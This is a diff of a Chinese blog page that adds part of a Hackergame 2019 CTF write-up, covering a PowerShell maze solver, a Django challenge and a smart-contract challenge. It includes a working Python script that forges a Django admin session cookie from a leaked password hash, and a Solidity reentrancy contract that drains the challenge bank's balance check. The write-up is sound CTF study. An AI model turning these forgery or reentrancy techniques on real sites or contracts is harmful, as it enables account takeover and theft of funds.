+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys,os,json,requests,re</span><br><span class="line">os.environ.setdefault(<span class="string">&#x27;DJANGO_SETTINGS_MODULE&#x27;</span>,<span class="string">&#x27;settings&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"><span class="keyword">from</span> django.contrib.sessions.backends <span class="keyword">import</span> signed_cookies</span><br><span class="line"><span class="keyword">from</span> django.utils.crypto <span class="keyword">import</span> salted_hmac</span><br><span class="line"></span><br><span class="line"><span class="comment"># key=None : SECRET_KEY</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> signing.loads(sess,key=<span class="literal">None</span>,salt = <span class="string">&quot;django.contrib.sessions.backends.signed_cookies&quot;</span>,max_age=<span class="number">1209600</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> signing.dumps(sess,key=<span class="literal">None</span>,salt = <span class="string">&quot;django.contrib.sessions.backends.signed_cookies&quot;</span>,compress = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">requestByCk</span>(<span class="params">ck</span>):</span></span><br><span class="line">    mcookie = &#123;<span class="string">&quot;sessionid&quot;</span>:ck&#125;</span><br><span class="line">    r = requests.get(<span class="string">&quot;http://202.38.93.241:10019/profile&quot;</span>,cookies = mcookie,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span>(r.status_code == <span class="number">200</span>):</span><br><span class="line">        rawstr = (r.text)</span><br><span class="line">        username = re.findall(<span class="string">r&quot;欢迎您，(.....)！&quot;</span>, rawstr)</span><br><span class="line">        <span class="keyword">if</span>(username[<span class="number">0</span>] == <span class="string">&#x27;admin&#x27;</span>):</span><br><span class="line">            flag = re.findall(<span class="string">r&quot;flag&#123;.*&#125;&quot;</span>, rawstr)</span><br><span class="line">            <span class="built_in">print</span>(flag[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">elif</span>(r.status_code == <span class="number">302</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Wrong Cookie.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error:&quot;</span>+r.status_code) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess = <span class="string">&quot;.eJxVjDEOgzAMRe_iGUUQULE7du8ZIid2GtoqkQhMVe8OSAzt-t97_wOO1yW5tersJoErWGh-N8_hpfkA8uT8KCaUvMyTN4diTlrNvYi-b6f7d5C4pr1uGXGI6AnHGLhjsuESqRdqByvYq_JohVDguwH3fzGM:1iKXmf:PfphreMrpv-FPLjjGGKUkcFgc2Q&quot;</span></span><br><span class="line">sess = decode(sess)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;decode:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(sess)</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE=&quot;</span></span><br><span class="line">adminHash = salted_hmac(<span class="string">&quot;django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash&quot;</span>, password).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(adminHash)</span><br><span class="line"></span><br><span class="line">sess[<span class="string">&quot;_auth_user_id&quot;</span>] = <span class="string">&quot;1&quot;</span></span><br><span class="line">sess[<span class="string">&quot;_auth_user_hash&quot;</span>] = adminHash</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;changed:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(sess)</span><br><span class="line">sess = encode(sess)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;encode:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(sess)</span><br><span class="line">requestByCk(sess)</span><br></pre></td></tr></table></figure>
 
-<p>
-        
+<h2 id="PowerShell-迷宫"><a href="#PowerShell-迷宫" class="headerlink" title="PowerShell 迷宫"></a>PowerShell 迷宫</h2><p>连接上服务器，cd到根目录，find查找<code>PSMaze.dll</code>，发现在<code>opt</code>文件夹中<br>使用<code>base64</code>命令输出，拿到程序二进制进行分析<br>发现在<code>MazeProvider.GetCellRepr</code>函数中会对当前节点进行判断，如果是终点则进行sha256计算，计算flag<br>写个powershell脚本遍历即可（使用Where-Object进行过滤，不走重复路线）<br>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ./PSMaze.dll</span><br><span class="line"></span><br><span class="line">function print_i($i) &#123;</span><br><span class="line">    if($i.X -eq 63)&#123;</span><br><span class="line">        if($i.Y -eq 63)&#123;</span><br><span class="line">        write-host $i.PSPath -fore green</span><br><span class="line">        write-host $i.Flag -fore red</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function foreachPath($startFolder, $passDir) &#123;</span><br><span class="line">    $colItems = Get-ChildItem $startFolder | Where-Object &#123; $_.Direction -ne $passDir &#125; | Sort-Object</span><br><span class="line">    foreach ($i in $colItems) &#123;</span><br><span class="line">        print_i $i</span><br><span class="line">        $passDir = getInv $i.PSPath</span><br><span class="line">        foreachPath $i.PSPath $passDir</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getInv($path) &#123;</span><br><span class="line">    $direction = split-path $path -Leaf</span><br><span class="line">    if ($direction -eq &quot;Up&quot;) &#123;</span><br><span class="line">        return &quot;Down&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($direction -eq &quot;Down&quot;) &#123;</span><br><span class="line">        return  &quot;Up&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($direction -eq &quot;Left&quot;) &#123;</span><br><span class="line">        return &quot;Right&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($direction -eq &quot;Right&quot;) &#123;</span><br><span class="line">        return &quot;Left&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreachPath &quot;Maze:/&quot; &quot;Up&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-          <a class="article-more-a" href="/2021/09/01/gradle-module-build-order-error/#more">查看更多 >></a>
-        
-    
-    
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PSMaze\Maze::\Down\Right\Down\Right\Down\Right\Down\Down\Down\Right\Down\Right\Down\Right\Right\Down\Right\Down\Right\Down\Left\Down\Left\Left\Left\Left\Left\Down\Down\Right\Down\Left\Left\Down\Left\Down\Down\Down\Down\Down\Down\Down\Right\Down\Left\Down\Right\Right\Down\Down\Left\Down\Left\Down\Down\Down\Right\Up\Right\Down\Right\Down\Right\Up\Right\Right\Up\Up\Right\Up\Up\Right\Up\Right\Up\Up\Right\Up\Right\Up\Up\Right\Down\Down\Right\Down\Down\Down\Down\Down\Right\Right\Down\Down\Down\Down\Right\Right\Down\Left\Down\Down\Left\Down\Down\Down\Left\Down\Down\Down\Down\Down\Left\Left\Down\Left\Down\Left\Down\Left\Down\Left\Down\Down\Left\Left\Left\Down\Down\Down\Right\Down\Down\Right\Up\Right\Down\Right\Right\Right\Down\Right\Down\Down\Right\Up\Right\Down\Right\Up\Right\Right\Down\Down\Right\Down\Right\Down\Down\Right\Right\Right\Up\Right\Right\Right\Up\Right\Right\Right\Right\Up\Left\Up\Up\Up\Up\Right\Right\Right\Up\Right\Right\Right\Right\Right\Down\Down\Down\Left\Down\Right\Down\Right\Right\Up\Up\Right\Right\Down\Down\Right\Up\Right\Up\Right\Up\Right\Right\Down\Down\Right\Right\Right\Right\Up\Left\Up\Right\Right\Down\Right\Right\Right\Right\Down\Down\Down\Down\Right\Down\Right\Right\Up\Right\Right\Right\Down\Left\Down\Right\Right\Down\Right</span><br><span class="line">flag&#123;D0_y0u_1ik3_PSC0r3_n0w_2C6BE488&#125;</span><br></pre></td></tr></table></figure>
 
+<h2 id="韭菜银行"><a href="#韭菜银行" class="headerlink" title="韭菜银行"></a>韭菜银行</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>执行</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(<span class="string">&quot;0xE575c9abD35Fa94F1949f7d559056bB66FddEB51&quot;</span>,<span class="number">2</span>,<span class="built_in">console</span>.log)</span><br></pre></td></tr></table></figure>
+<p>获取到secert的值，提交即可得到flag</p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p><code>withdraw</code>函数存在重入和溢出漏洞，构造攻击合约，使余额为一个大数<br>然后使用攻击合约调用<code>get_flag_2</code>，即可设置got_flag字段的值，从而获得flag<br>攻击合约:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.26;</span><br><span class="line"></span><br><span class="line">contract JCBank &#123;</span><br><span class="line">    mapping (address =&gt; uint) public balance;</span><br><span class="line">    mapping (uint =&gt; bool) public got_flag;</span><br><span class="line">    uint128 secret;</span><br><span class="line"></span><br><span class="line">    constructor (uint128 init_secret) public &#123;</span><br><span class="line">        secret = init_secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balance[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint amount) public &#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= amount);</span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">        balance[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_flag_1(uint128 guess) public view returns(string) &#123;</span><br><span class="line">        require(guess == secret);</span><br><span class="line"></span><br><span class="line">        bytes memory h = new bytes(32);</span><br><span class="line">        for (uint i = 0; i &lt; 32; i++) &#123;</span><br><span class="line">            uint b = (secret &gt;&gt; (4 * i)) &amp; 0xF;</span><br><span class="line">            if (b &lt; 10) &#123;</span><br><span class="line">                h[31 - i] = byte(b + 48);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                h[31 - i] = byte(b + 87);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return string(abi.encodePacked(&quot;flag&#123;&quot;, h, &quot;&#125;&quot;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_flag_2(uint user_id) public &#123;</span><br><span class="line">        require(balance[msg.sender] &gt; 1000000000000 ether);</span><br><span class="line">        got_flag[user_id] = true;</span><br><span class="line">        balance[msg.sender] = 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Battach&#123;</span><br><span class="line">    address target;</span><br><span class="line">    address owner;</span><br><span class="line">    uint256 money;</span><br><span class="line">    JCBank g;</span><br><span class="line">    uint flag = 0;</span><br><span class="line">    </span><br><span class="line">    modifier ownerOnly &#123;</span><br><span class="line">        require(owner == msg.sender);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    // 构造函数初始化合约所有者的地址</span><br><span class="line">    constructor() payable public&#123;</span><br><span class="line">        target = 0xE575c9abD35Fa94F1949f7d559056bB66FddEB51;</span><br><span class="line">         g = JCBank(target);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        money = 1;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function getFlag(uint _user_id) ownerOnly payable&#123;</span><br><span class="line">     g.get_flag_2(_user_id);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    //开始攻击合约</span><br><span class="line">    function startattach() ownerOnly payable&#123;</span><br><span class="line">        require(msg.value &gt;= 1);</span><br><span class="line">       flag = 0;</span><br><span class="line">       g.deposit.value(money)();</span><br><span class="line">       g.withdraw(money);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    // 销毁合约，相当于C++里的析构</span><br><span class="line">    function stopattach() ownerOnly&#123;</span><br><span class="line">        selfdestruct(owner);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //fallback 函数</span><br><span class="line">    function() payable&#123;</span><br><span class="line">        require(flag == 0);</span><br><span class="line">        flag = 1;</span><br><span class="line">        g.withdraw(money);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="没有-BUG-的教务系统"><a href="#没有-BUG-的教务系统" class="headerlink" title="没有 BUG 的教务系统"></a>没有 BUG 的教务系统</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p>定位到判断代码</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i)</span><br><span class="line">    temp_password[i] = ((temp_password[i] | temp_password[i + <span class="number">1</span>]) &amp; ~(temp_password[i] &amp; temp_password[i + <span class="number">1</span>]) | i) &amp; ~((temp_password[i] | temp_password[i + <span class="number">1</span>]) &amp; ~(temp_password[i] &amp; temp_password[i + <span class="number">1</span>]) &amp; i);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(temp_password, <span class="string">&quot;\x44\x00\x02\x41\x43\x47\x10\x63\x00&quot;</span>, <span class="number">9</span>)) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Bad guy! Wrong password!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>会对当前位和下一位进行运算，但是循环并没有操作最后一个字符00，所以从后往前逆推即可得到第一个flag</p>
+<h2 id="比赛时间内未完成的题"><a href="#比赛时间内未完成的题" class="headerlink" title="比赛时间内未完成的题"></a>比赛时间内未完成的题</h2><p>见<a href="https://blog.xhyeax.com/2019/10/22/hackersgame-2019-fails">Hackersgame 2019 的一些失败尝试及复现</a></p>
+<p>还是太菜了 = =</p>
+
+
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"></i>感谢支持</i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -223,7 +298,7 @@ var _hmt = _hmt || [];
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">经验</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
         		</li>
       		
 		</ul>
@@ -232,16 +307,84 @@ var _hmt = _hmt || [];
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/09/01/gradle-module-build-order-error/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://blog.xhyeax.com/2019/10/22/hackersgame-2019-writeup/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2019/10/22/hackersgame-2019-fails/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Hackersgame 2019 的一些失败尝试及复现
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/10/15/db-sqlite3-to-sql/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">导出sqlite3数据库为sql</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -256,890 +399,32 @@ var _hmt = _hmt || [];
         </div>
         
         
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-android-arm-plt-hook" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/30/android-arm-plt-hook/">简易Android ARM&amp;ARM64 GOT Hook (二)</a>
-    </h1>
-  
-
-
-        
-        <a href="/2021/08/30/android-arm-plt-hook/" class="archive-article-date">
-  	<time datetime="2021-08-30T02:56:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-30</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-
-      
-    
-        
-        
-            
-            
-        
-            
-            
-        
-            
-            
-        
-        
-            
-            <p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>前文<a href="https://blog.xhyeax.com/2021/08/23/android-arm-got-hook/">简易Android ARM&amp;ARM64 GOT Hook (一)</a>，基于链接视图，解析section查找GOT表偏移值，无法应对section被处理过的情况（如加固）。</p>
-<p>本文基于ELF的执行视图(<code>Execution View</code>)，讨论<code>Android</code> <code>ARM&amp;ARM64</code>架构的<code>GOT/PLT Hook</code>（仍以Hook公共库<code>libc.so</code>的<code>getpid</code>函数为例）。</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
-<p>
-        
-
-          <a class="article-more-a" href="/2021/08/30/android-arm-plt-hook/#more">查看更多 >></a>
-        
-    
-    
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/30/android-arm-plt-hook/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E4%B8%8E%E5%A4%9C"><span class="toc-number">2.</span> <span class="toc-text">白与夜</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8-2077"><span class="toc-number">3.</span> <span class="toc-text">信息安全 2077</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%87%E5%AE%99%E7%BB%88%E6%9E%81%E9%97%AE%E9%A2%98%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">宇宙终极问题（部分）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#42"><span class="toc-number">4.1.</span> <span class="toc-text">42</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E8%AF%BB%E5%8F%96%E5%99%A8"><span class="toc-number">5.</span> <span class="toc-text">网页读取器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%BE%E6%8B%89%E5%B4%A9%E5%90%A7%E5%A4%A7%E5%86%92%E9%99%A9"><span class="toc-number">6.</span> <span class="toc-text">达拉崩吧大冒险</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Happy-LUG"><span class="toc-number">7.</span> <span class="toc-text">Happy LUG</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E9%AA%8C%E8%AF%81%E5%99%A8"><span class="toc-number">8.</span> <span class="toc-text">正则验证器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E5%B7%A7%E7%8E%B2%E7%8F%91%E7%9A%84-ELF"><span class="toc-number">9.</span> <span class="toc-text">小巧玲珑的 ELF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell%E4%B8%89%E9%AA%87%E5%AE%A2"><span class="toc-number">10.</span> <span class="toc-text">Shell三骇客</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ShellHacker1"><span class="toc-number">10.1.</span> <span class="toc-text">ShellHacker1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ShellHacker2"><span class="toc-number">10.2.</span> <span class="toc-text">ShellHacker2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ShellHacker3"><span class="toc-number">10.3.</span> <span class="toc-text">ShellHacker3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E6%95%99%E5%A5%87%E5%A6%99%E5%A4%9C"><span class="toc-number">11.</span> <span class="toc-text">三教奇妙夜</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F-U-%E7%9A%84%E5%8A%A0%E5%AF%86"><span class="toc-number">12.</span> <span class="toc-text">小 U 的加密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8C%AE%E7%BB%99%E6%9C%80%E5%A5%BD%E7%9A%84%E4%BD%A0"><span class="toc-number">13.</span> <span class="toc-text">献给最好的你</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E6%83%B3%E8%A6%81%E4%B8%AA%E5%AE%B6"><span class="toc-number">14.</span> <span class="toc-text">我想要个家</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%BC%80%E5%A7%8B%E7%9A%84%E5%B0%9D%E8%AF%95"><span class="toc-number">14.1.</span> <span class="toc-text">一开始的尝试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%81%9A%E6%B3%95"><span class="toc-number">14.2.</span> <span class="toc-text">逆向做法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A2%AB%E6%B3%84%E6%BC%8F%E7%9A%84%E5%A7%9C%E6%88%88"><span class="toc-number">15.</span> <span class="toc-text">被泄漏的姜戈</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PowerShell-%E8%BF%B7%E5%AE%AB"><span class="toc-number">16.</span> <span class="toc-text">PowerShell 迷宫</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9F%AD%E8%8F%9C%E9%93%B6%E8%A1%8C"><span class="toc-number">17.</span> <span class="toc-text">韭菜银行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1"><span class="toc-number">17.1.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2"><span class="toc-number">17.2.</span> <span class="toc-text">flag2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%A1%E6%9C%89-BUG-%E7%9A%84%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F"><span class="toc-number">18.</span> <span class="toc-text">没有 BUG 的教务系统</span></a><ol 